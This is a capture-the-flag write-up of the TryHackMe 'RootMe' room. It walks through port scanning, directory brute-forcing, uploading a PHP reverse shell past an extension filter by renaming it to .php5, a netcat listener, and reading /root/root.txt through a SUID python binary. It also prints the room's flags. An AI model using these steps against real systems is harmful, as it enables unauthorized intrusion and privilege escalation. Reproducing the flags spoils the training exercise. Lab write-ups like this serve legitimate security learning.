# thm-RootMe
 
https://tryhackme.com/room/rrootme

`IP = 10.10.239.220`

## Scan the machine, how many ports are open?

```bash
└─$ nmap -A -oA nmap/ 10.10.239.220            

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 10:59 EDT
Nmap scan report for 10.10.239.220 (10.10.239.220)
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.70 seconds

```

## What version of Apache is running?

From nmap
`Apache/2.4.29 (Ubuntu)`

## What service is running on port 22?

From nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```


## Find directories on the web server using the GoBuster tool.

```bash
gobuster dir -u 10.10.239.220 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee ./gobuster/scan.log
```

## What is the hidden directory?

From Gobuster
`/panel/`

## Find a form to upload and get a reverse shell, and find the flag.

I can use the /panel site to upload a script.
Lets try uploading a php reverse shell.

```bash
nc -nlvp 4444    #Attacker
```

Then Upload the file.

When uploadinf trhety I get
`PHP não é permitido!`
Lets try and change the extension maybe

`mv php-reverse-shell.php rev`

That worked - but no callback - maybe it needs to be in a php format. Lets try php5

`mv rev rev.php5`

The access `http://10.10.152.34/uploads/rev.php5` to detonate it.

And I have the shell!

Once conntected I find `THM{y0u_g0t_a_sh3ll}`



## Search for files with SUID permission, which file is weird?

Lets Enumerate using pwncat
```bash
local) pwncat$ run enumerate
```

```
  - file read as root via /usr/bin/python (SUID) from root (linux.enumerate.file.suid)
```

## Find a form to escalate your privileges.

Lets see if we can use pwncat for this..

```bash
(local) pwncat$ escalate run
[12:10:19] 10.10.152.34:39676: error: no working escalation paths found for root     
```

Looks like there is nothing pwncat can do. 
Lets try ourselves...


```bash
python -c 'print(open("/root/root.txt").read())'
```

This reads us out the final flag :)



